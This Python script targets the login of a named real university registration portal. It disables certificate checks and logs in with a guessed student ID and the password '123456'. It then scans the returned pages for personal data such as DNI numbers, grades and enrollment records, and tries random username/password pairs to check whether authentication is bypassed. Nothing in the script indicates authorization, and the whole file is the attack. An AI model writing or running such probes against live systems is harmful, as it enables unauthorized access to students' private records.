#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()
registro = 'https://registro.uns.edu.pe'
url = f'{registro}/udemsi/j_security_check'

s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': f'{registro}/udemsi/faces/index.xhtml',
})
s.get(f'{registro}/udemsi/faces/index.xhtml', timeout=5)

# Login
r = s.post(url, data={'j_username':'2018001','j_password':'123456'}, timeout=5, allow_redirects=True)
print(f'Login status: {r.status_code}')
print(f'Cookies: {dict(s.cookies)}')

title_match = re.search(r'<title>([^<]+)</title>', r.text)
print(f'Title: {title_match.group(1) if title_match else "No title"}')

if 'j_username' in r.text.lower():
    print('Still on login page - LOGIN FAILED')
elif 'modulos' in r.text.lower():
    print('ACCESS GRANTED - on modules page')
elif 'bienvenida' in r.text.lower() or 'welcome' in r.text.lower():
    print('ACCESS GRANTED - welcome page')
else:
    print('Unknown page')

# Check modulos.xhtml
r2 = s.get(f'{registro}/udemsi/faces/modulos.xhtml', timeout=5)
text2 = re.sub(r'<[^>]+>', ' ', r2.text)
text2 = re.sub(r'\s+', ' ', text2)
if 'No records' in text2:
    print('modulos.xhtml: No records (empty)')
elif 'j_username' in text2.lower():
    print('modulos.xhtml: Login form shown')
else:
    print(f'modulos.xhtml: {text2[:500]}')

# Look for ANY data
for kw in ['estudiante', 'alumno', 'nota', 'matricula', 'semestre', 'codigo', 'dni', 'modulo', 'curso']:
    if kw in text2.lower():
        idx = text2.lower().find(kw)
        context = text2[max(0,idx-30):idx+80]
        print(f'  Found "{kw}": ...{context}...')

# Try to check if ALL credentials work
print('\n--- Verificando si login siempre funciona ---')
s2 = requests.Session()
s2.verify = False
s2.headers.update({'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'})
s2.get(f'{registro}/udemsi/faces/index.xhtml', timeout=5)

# Try completely random credentials
random_creds = [('fake', 'fake'), ('test', 'wrong'), ('abc', 'xyz')]
for u, p in random_creds:
    r = s2.post(url, data={'j_username': u, 'j_password': p}, timeout=5, allow_redirects=True)
    if 'j_username' not in r.text.lower():
        print(f'  {u}/{p} -> LOGIN EXITOSO (sin verificar!)')
    else:
        print(f'  {u}/{p} -> LOGIN FALLIDO')
